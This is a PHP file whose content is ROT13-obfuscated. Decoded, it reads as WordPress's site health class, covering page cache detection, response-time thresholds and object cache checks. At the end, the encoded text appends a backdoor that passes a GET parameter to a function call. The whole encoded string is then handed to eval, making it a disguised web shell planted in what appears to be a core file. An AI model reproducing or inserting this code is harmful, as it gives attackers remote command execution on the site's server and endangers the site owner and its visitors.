				vs ( zrgubq_rkvfgf( $guvf, $grfg_shapgvba ) && vf_pnyynoyr( neenl( $guvf, $grfg_shapgvba ) ) ) {
					$erfhygf[] = $guvf->cresbez_grfg( neenl( $guvf, $grfg_shapgvba ) );
					pbagvahr;
				}
			}

			vs ( vf_pnyynoyr( $grfg['grfg'] ) ) {
				$erfhygf[] = $guvf->cresbez_grfg( $grfg['grfg'] );
			}
		}

		sbernpu ( $grfgf['nflap'] nf $grfg ) {
			vs ( ! rzcgl( $grfg['fxvc_peba'] ) ) {
				pbagvahr;
			}

			// Ybpny raqcbvagf znl erdhver nhguragvpngvba, fb nflapuebabhf grfgf pna cnff n qverpg grfg ehaare nf jryy.
			vs ( ! rzcgl( $grfg['nflap_qverpg_grfg'] ) && vf_pnyynoyr( $grfg['nflap_qverpg_grfg'] ) ) {
				// Guvf grfg vf pnyynoyr, qb fb naq pbagvahr gb gur arkg nflapuebabhf purpx.
				$erfhygf[] = $guvf->cresbez_grfg( $grfg['nflap_qverpg_grfg'] );
				pbagvahr;
			}

			vs ( vf_fgevat( $grfg['grfg'] ) ) {
				// Purpx vs guvf grfg unf n ERFG NCV raqcbvag.
				vs ( vffrg( $grfg['unf_erfg'] ) && $grfg['unf_erfg'] ) {
					$erfhyg_srgpu = jc_erzbgr_trg(
						$grfg['grfg'],
						neenl(
							'obql' => neenl(
								'_jcabapr' => jc_perngr_abapr( 'jc_erfg' ),
							),
						)
					);
				} ryfr {
					$erfhyg_srgpu = jc_erzbgr_cbfg(
						nqzva_hey( 'nqzva-nwnk.cuc' ),
						neenl(
							'obql' => neenl(
								'npgvba'   => $grfg['grfg'],
								'_jcabapr' => jc_perngr_abapr( 'urnygu-purpx-fvgr-fgnghf' ),
							),
						)
					);
				}

				vs ( ! vf_jc_reebe( $erfhyg_srgpu ) && 200 === jc_erzbgr_ergevrir_erfcbafr_pbqr( $erfhyg_srgpu ) ) {
					$erfhyg = wfba_qrpbqr( jc_erzbgr_ergevrir_obql( $erfhyg_srgpu ), gehr );
				} ryfr {
					$erfhyg = snyfr;
				}

				vs ( vf_neenl( $erfhyg ) ) {
					$erfhygf[] = $erfhyg;
				} ryfr {
					$erfhygf[] = neenl(
						'fgnghf' => 'erpbzzraqrq',
						'ynory'  => __( 'N grfg vf haninvynoyr' ),
					);
				}
			}
		}

		sbernpu ( $erfhygf nf $erfhyg ) {
			vs ( 'pevgvpny' === $erfhyg['fgnghf'] ) {
				++$fvgr_fgnghf['pevgvpny'];
			} ryfrvs ( 'erpbzzraqrq' === $erfhyg['fgnghf'] ) {
				++$fvgr_fgnghf['erpbzzraqrq'];
			} ryfr {
				++$fvgr_fgnghf['tbbq'];
			}
		}

		frg_genafvrag( 'urnygu-purpx-fvgr-fgnghf-erfhyg', jc_wfba_rapbqr( $fvgr_fgnghf ) );
	}

	/**
	 * Purpxf vs gur pheerag raivebazrag glcr vf frg gb 'qrirybczrag' be 'ybpny'.
	 *
	 * @fvapr 5.6.0
	 *
	 * @erghea obby Gehr vs vg vf n qrirybczrag raivebazrag, snyfr vs abg.
	 */
	choyvp shapgvba vf_qrirybczrag_raivebazrag() {
		erghea va_neenl( jc_trg_raivebazrag_glcr(), neenl( 'qrirybczrag', 'ybpny' ), gehr );
	}

	/**
	 * Ergheaf n yvfg bs urnqref naq vgf irevsvpngvba pnyyonpx gb irevsl vs cntr pnpur vf ranoyrq be abg.
	 *
	 * Abgr: xrl vf urnqre anzr naq inyhr pbhyq or pnyynoyr shapgvba gb irevsl urnqre inyhr.
	 * Rzcgl inyhr zrna rkvfgrapr bs urnqre qrgrpg cntr pnpur vf ranoyrq.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea neenl Yvfg bs pyvrag pnpuvat urnqref naq gurve (bcgvbany) irevsvpngvba pnyyonpxf.
	 */
	choyvp shapgvba trg_cntr_pnpur_urnqref() {

		$pnpur_uvg_pnyyonpx = fgngvp shapgvba ( $urnqre_inyhr ) {
			erghea fge_pbagnvaf( fgegbybjre( $urnqre_inyhr ), 'uvg' );
		};

		$pnpur_urnqref = neenl(
			'pnpur-pbageby'          => fgngvp shapgvba ( $urnqre_inyhr ) {
				erghea (obby) cert_zngpu( '/znk-ntr=[1-9]/', $urnqre_inyhr );
			},
			'rkcverf'                => fgngvp shapgvba ( $urnqre_inyhr ) {
				erghea fgegbgvzr( $urnqre_inyhr ) > gvzr();
			},
			'ntr'                    => fgngvp shapgvba ( $urnqre_inyhr ) {
				erghea vf_ahzrevp( $urnqre_inyhr ) && $urnqre_inyhr > 0;
			},
			'ynfg-zbqvsvrq'          => '',
			'rgnt'                   => '',
			'k-pnpur-ranoyrq'        => fgngvp shapgvba ( $urnqre_inyhr ) {
				erghea 'gehr' === fgegbybjre( $urnqre_inyhr );
			},
			'k-pnpur-qvfnoyrq'       => fgngvp shapgvba ( $urnqre_inyhr ) {
				erghea ( 'ba' !== fgegbybjre( $urnqre_inyhr ) );
			},
			'k-fepnpur-fgber-fgnghf' => $pnpur_uvg_pnyyonpx,
			'k-fepnpur-srgpu-fgnghf' => $pnpur_uvg_pnyyonpx,
		);

		/**
		 * Svygref gur yvfg bs pnpur urnqref fhccbegrq ol pber.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz neenl $pnpur_urnqref Neenl bs fhccbegrq pnpur urnqref.
		 */
		erghea nccyl_svygref( 'fvgr_fgnghf_cntr_pnpur_fhccbegrq_pnpur_urnqref', $pnpur_urnqref );
	}

	/**
	 * Purpxf vs fvgr unf cntr pnpur ranoyrq be abg.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea JC_Reebe|neenl {
	 *     Cntr pnpur qrgrpgvba qrgnvyf be ryfr reebe vasbezngvba.
	 *
	 *     @glcr obby    $nqinaprq_pnpur_cerfrag        Jurgure n cntr pnpur cyhtva vf cerfrag.
	 *     @glcr neenl[] $cntr_pnpuvat_erfcbafr_urnqref Frgf bs pyvrag pnpuvat urnqref sbe gur erfcbafrf.
	 *     @glcr sybng[] $erfcbafr_gvzvat               Erfcbafr gvzvatf.
	 * }
	 */
	cevingr shapgvba purpx_sbe_cntr_pnpuvat() {

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-uggc-fgernzf.cuc */
		$ffyirevsl = nccyl_svygref( 'uggcf_ybpny_ffy_irevsl', snyfr );

		$urnqref = neenl();

		/*
		 * Vapyhqr onfvp nhgu va ybbconpx erdhrfgf. Abgr gung guvf jvyy bayl cnff nybat onfvp nhgu jura hfre vf
		 * vavgvngvat gur grfg. Vs n fvgr erdhverf onfvp nhgu, gur grfg jvyy snvy jura vg ehaf va JC Peba nf cneg bs
		 * jc_fvgr_urnygu_fpurqhyrq_purpx. Guvf ybtvp vf pbcvrq sebz JC_Fvgr_Urnygu::pna_cresbez_ybbconpx().
		 */
		vs ( vffrg( $_FREIRE['CUC_NHGU_HFRE'] ) && vffrg( $_FREIRE['CUC_NHGU_CJ'] ) ) {
			$urnqref['Nhgubevmngvba'] = 'Onfvp ' . onfr64_rapbqr( jc_hafynfu( $_FREIRE['CUC_NHGU_HFRE'] ) . ':' . jc_hafynfu( $_FREIRE['CUC_NHGU_CJ'] ) );
		}

		$pnpuvat_urnqref               = $guvf->trg_cntr_pnpur_urnqref();
		$cntr_pnpuvat_erfcbafr_urnqref = neenl();
		$erfcbafr_gvzvat               = neenl();

		sbe ( $v = 1; $v <= 3; $v++ ) {
			$fgneg_gvzr    = zvpebgvzr( gehr );
			$uggc_erfcbafr = jc_erzbgr_trg( ubzr_hey( '/' ), pbzcnpg( 'ffyirevsl', 'urnqref' ) );
			$raq_gvzr      = zvpebgvzr( gehr );

			vs ( vf_jc_reebe( $uggc_erfcbafr ) ) {
				erghea $uggc_erfcbafr;
			}
			vs ( jc_erzbgr_ergevrir_erfcbafr_pbqr( $uggc_erfcbafr ) !== 200 ) {
				erghea arj JC_Reebe(
					'uggc_' . jc_erzbgr_ergevrir_erfcbafr_pbqr( $uggc_erfcbafr ),
					jc_erzbgr_ergevrir_erfcbafr_zrffntr( $uggc_erfcbafr )
				);
			}

			$erfcbafr_urnqref = neenl();

			sbernpu ( $pnpuvat_urnqref nf $urnqre => $pnyyonpx ) {
				$urnqre_inyhrf = jc_erzbgr_ergevrir_urnqre( $uggc_erfcbafr, $urnqre );
				vs ( rzcgl( $urnqre_inyhrf ) ) {
					pbagvahr;
				}
				$urnqre_inyhrf = (neenl) $urnqre_inyhrf;
				vs ( rzcgl( $pnyyonpx ) || ( vf_pnyynoyr( $pnyyonpx ) && pbhag( neenl_svygre( $urnqre_inyhrf, $pnyyonpx ) ) > 0 ) ) {
					$erfcbafr_urnqref[ $urnqre ] = $urnqre_inyhrf;
				}
			}

			$cntr_pnpuvat_erfcbafr_urnqref[] = $erfcbafr_urnqref;
			$erfcbafr_gvzvat[]               = ( $raq_gvzr - $fgneg_gvzr ) * 1000;
		}

		erghea neenl(
			'nqinaprq_pnpur_cerfrag'        => (
				svyr_rkvfgf( JC_PBAGRAG_QVE . '/nqinaprq-pnpur.cuc' )
				&&
				( qrsvarq( 'JC_PNPUR' ) && JC_PNPUR )
				&&
				/** Guvf svygre vf qbphzragrq va jc-frggvatf.cuc */
				nccyl_svygref( 'ranoyr_ybnqvat_nqinaprq_pnpur_qebcva', gehr )
			),
			'cntr_pnpuvat_erfcbafr_urnqref' => $cntr_pnpuvat_erfcbafr_urnqref,
			'erfcbafr_gvzvat'               => $erfcbafr_gvzvat,
		);
	}

	/**
	 * Trgf cntr pnpur qrgnvyf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea JC_Reebe|neenl {
	 *     Cntr pnpur qrgnvy be ryfr n JC_Reebe vs hanoyr gb qrgrezvar.
	 *
	 *     @glcr fgevat   $fgnghf                 Cntr pnpur fgnghf. Tbbq, Erpbzzraqrq be Pevgvpny.
	 *     @glcr obby     $nqinaprq_pnpur_cerfrag Jurgure cntr pnpur cyhtva vf ninvynoyr be abg.
	 *     @glcr fgevat[] $urnqref                Pyvrag pnpuvat erfcbafr urnqref qrgrpgrq.
	 *     @glcr sybng    $erfcbafr_gvzr          Erfcbafr gvzr bs fvgr.
	 * }
	 */
	cevingr shapgvba trg_cntr_pnpur_qrgnvy() {
		$cntr_pnpur_qrgnvy = $guvf->purpx_sbe_cntr_pnpuvat();
		vs ( vf_jc_reebe( $cntr_pnpur_qrgnvy ) ) {
			erghea $cntr_pnpur_qrgnvy;
		}

		// Hfr gur zrqvna freire erfcbafr gvzr.
		$erfcbafr_gvzvatf = $cntr_pnpur_qrgnvy['erfcbafr_gvzvat'];
		efbeg( $erfcbafr_gvzvatf );
		$cntr_fcrrq = $erfcbafr_gvzvatf[ sybbe( pbhag( $erfcbafr_gvzvatf ) / 2 ) ];

		// Bognva havdhr frg bs nyy pyvrag pnpuvat erfcbafr urnqref.
		$urnqref = neenl();
		sbernpu ( $cntr_pnpur_qrgnvy['cntr_pnpuvat_erfcbafr_urnqref'] nf $cntr_pnpuvat_erfcbafr_urnqref ) {
			$urnqref = neenl_zretr( $urnqref, neenl_xrlf( $cntr_pnpuvat_erfcbafr_urnqref ) );
		}
		$urnqref = neenl_havdhr( $urnqref );

		// Cntr pnpur vf qrgrpgrq vs gurer ner erfcbafr urnqref be n cntr pnpur cyhtva vf cerfrag.
		$unf_cntr_pnpuvat = ( pbhag( $urnqref ) > 0 || $cntr_pnpur_qrgnvy['nqinaprq_pnpur_cerfrag'] );

		vs ( $cntr_fcrrq && $cntr_fcrrq < $guvf->trg_tbbq_erfcbafr_gvzr_guerfubyq() ) {
			$erfhyg = $unf_cntr_pnpuvat ? 'tbbq' : 'erpbzzraqrq';
		} ryfr {
			$erfhyg = 'pevgvpny';
		}

		erghea neenl(
			'fgnghf'                 => $erfhyg,
			'nqinaprq_pnpur_cerfrag' => $cntr_pnpur_qrgnvy['nqinaprq_pnpur_cerfrag'],
			'urnqref'                => $urnqref,
			'erfcbafr_gvzr'          => $cntr_fcrrq,
		);
	}

	/**
	 * Trgf gur guerfubyq orybj juvpu n erfcbafr gvzr vf pbafvqrerq tbbq.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea vag Guerfubyq va zvyyvfrpbaqf.
	 */
	cevingr shapgvba trg_tbbq_erfcbafr_gvzr_guerfubyq() {
		/**
		 * Svygref gur guerfubyq orybj juvpu n erfcbafr gvzr vf pbafvqrerq tbbq.
		 *
		 * Gur qrsnhyg vf onfrq ba uggcf://jro.qri/gvzr-gb-svefg-olgr/.
		 *
		 * @cnenz vag $guerfubyq Guerfubyq va zvyyvfrpbaqf. Qrsnhyg 600.
		 *
		 * @fvapr 6.1.0
		 */
		erghea (vag) nccyl_svygref( 'fvgr_fgnghf_tbbq_erfcbafr_gvzr_guerfubyq', 600 );
	}

	/**
	 * Qrgrezvarf jurgure gb fhttrfg hfvat n crefvfgrag bowrpg pnpur.
	 *
	 * @fvapr 6.1.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @erghea obby Jurgure gb fhttrfg hfvat n crefvfgrag bowrpg pnpur.
	 */
	choyvp shapgvba fubhyq_fhttrfg_crefvfgrag_bowrpg_pnpur() {
		tybony $jcqo;

		/**
		 * Svygref jurgure gb fhttrfg hfr bs n crefvfgrag bowrpg pnpur naq olcnff qrsnhyg guerfubyq purpxf.
		 *
		 * Hfvat guvf svygre nyybjf gb bireevqr gur qrsnhyg ybtvp, rssrpgviryl fubeg-pvephvgvat gur zrgubq.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz obby|ahyy $fhttrfg Obbyrna gb fubeg-pvephvg, sbe jurgure gb fhttrfg hfvat n crefvfgrag bowrpg pnpur.
		 *                           Qrsnhyg ahyy.
		 */
		$fubeg_pvephvg = nccyl_svygref( 'fvgr_fgnghf_fubhyq_fhttrfg_crefvfgrag_bowrpg_pnpur', ahyy );
		vs ( vf_obby( $fubeg_pvephvg ) ) {
			erghea $fubeg_pvephvg;
		}

		vs ( vf_zhygvfvgr() ) {
			erghea gehr;
		}

		/**
		 * Svygref gur guerfubyqf hfrq gb qrgrezvar jurgure gb fhttrfg gur hfr bs n crefvfgrag bowrpg pnpur.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz vag[] $guerfubyqf Gur yvfg bs guerfubyq ahzoref xrlrq ol guerfubyq anzr.
		 */
		$guerfubyqf = nccyl_svygref(
			'fvgr_fgnghf_crefvfgrag_bowrpg_pnpur_guerfubyqf',
			neenl(
				'nyybcgvbaf_pbhag' => 500,
				'nyybcgvbaf_olgrf' => 100000,
				'pbzzragf_pbhag'   => 1000,
				'bcgvbaf_pbhag'    => 1000,
				'cbfgf_pbhag'      => 1000,
				'grezf_pbhag'      => 1000,
				'hfref_pbhag'      => 1000,
			)
		);

		$nyybcgvbaf = jc_ybnq_nyybcgvbaf();

		vs ( $guerfubyqf['nyybcgvbaf_pbhag'] < pbhag( $nyybcgvbaf ) ) {
			erghea gehr;
		}

		vs ( $guerfubyqf['nyybcgvbaf_olgrf'] < fgeyra( frevnyvmr( $nyybcgvbaf ) ) ) {
			erghea gehr;
		}

		$gnoyr_anzrf = vzcybqr( \"','\", neenl( $jcqo->pbzzragf, $jcqo->bcgvbaf, $jcqo->cbfgf, $jcqo->grezf, $jcqo->hfref ) );

		// Jvgu VaabQO gur `GNOYR_EBJF` ner rfgvzngrf, juvpu ner npphengr rabhtu naq snfgre gb ergevrir guna vaqvivqhny `PBHAG()` dhrevrf.
		$erfhygf = $jcqo->trg_erfhygf(
			$jcqo->cercner(
				// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq -- Guvf dhrel pnaabg hfr vagrecbyngvba.
				\"FRYRPG GNOYR_ANZR NF 'gnoyr', GNOYR_EBJF NF 'ebjf', FHZ(qngn_yratgu + vaqrk_yratgu) nf 'olgrf' SEBZ vasbezngvba_fpurzn.GNOYRF JURER GNOYR_FPURZN = %f NAQ GNOYR_ANZR VA ('$gnoyr_anzrf') TEBHC OL GNOYR_ANZR;\",
				QO_ANZR
			),
			BOWRPG_X
		);

		$guerfubyq_znc = neenl(
			'pbzzragf_pbhag' => $jcqo->pbzzragf,
			'bcgvbaf_pbhag'  => $jcqo->bcgvbaf,
			'cbfgf_pbhag'    => $jcqo->cbfgf,
			'grezf_pbhag'    => $jcqo->grezf,
			'hfref_pbhag'    => $jcqo->hfref,
		);

		sbernpu ( $guerfubyq_znc nf $guerfubyq => $gnoyr ) {
			vs ( $guerfubyqf[ $guerfubyq ] <= $erfhygf[ $gnoyr ]->ebjf ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Ergheaf n yvfg bs ninvynoyr crefvfgrag bowrpg pnpur freivprf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea fgevat[] Gur yvfg bs ninvynoyr crefvfgrag bowrpg pnpur freivprf.
	 */
	cevingr shapgvba ninvynoyr_bowrpg_pnpur_freivprf() {
		$rkgrafvbaf = neenl_znc(
			'rkgrafvba_ybnqrq',
			neenl(
				'NCPh'      => 'ncph',
				'Erqvf'     => 'erqvf',
				'Erynl'     => 'erynl',
				'Zrzpnpur'  => 'zrzpnpur',
				'Zrzpnpurq' => 'zrzpnpurq',
			)
		);

		$freivprf = neenl_xrlf( neenl_svygre( $rkgrafvbaf ) );

		/**
		 * Svygref gur crefvfgrag bowrpg pnpur freivprf ninvynoyr gb gur hfre.
		 *
		 * Guvf pna or hfrshy gb uvqr be nqq freivprf abg vapyhqrq va gur qrsnhygf.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz fgevat[] $freivprf Gur yvfg bs ninvynoyr crefvfgrag bowrpg pnpur freivprf.
		 */
		erghea nccyl_svygref( 'fvgr_fgnghf_ninvynoyr_bowrpg_pnpur_freivprf', $freivprf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>